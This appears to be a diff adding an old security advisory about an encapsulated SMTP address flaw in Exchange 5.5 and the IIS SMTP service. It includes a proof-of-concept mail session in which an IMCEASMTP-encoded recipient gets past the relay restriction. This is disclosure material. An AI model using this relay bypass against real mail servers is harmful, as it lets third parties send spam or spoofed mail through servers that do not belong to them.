@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/5213/info
+
+Microsoft Exchange 5.5 and the SMTP (Simple Mail Transfer Protocol) service included with IIS (Internet Information Services) 4.0 and 5.0 are vulnerable to an encapsulated SMTP address vulnerability.
+
+The vulnerability was originally announced in Microsoft Security Bulletin MS99-027 and reported to affect Exchange Server 5.5. Microsoft released a patch to fix the vulnerability for Exchange Server 5.5 only. It has been recently reported that this vulnerability also affects the SMTP service included with Microsoft IIS 4.0 and 5.0. There exists no patch for the IIS SMTP service.
+
+220 test-mailer Microsoft ESMTP MAIL Service, Version: 5.0.2195.4905 ready
+at
+Tue, 28 May 2002 14:54:10 +0100
+helo
+250 test-mailer Hello [IP address of source host]
+MAIL FROM: test@test.com
+250 2.1.0 test@test.com....Sender OK
+RCPT TO: test2@test.com
+550 5.7.1 Unable to relay for test@test.com
+RCPT TO: IMCEASMTP-test+40test+2Ecom@victim.co.uk
+250 2.1.5 IMCEASMTP-test+40test+2Ecom@victim.co.uk
+data
+354 Start mail input; end with <CRLF>.<CRLF>
+Subject: You are vulnerable. 
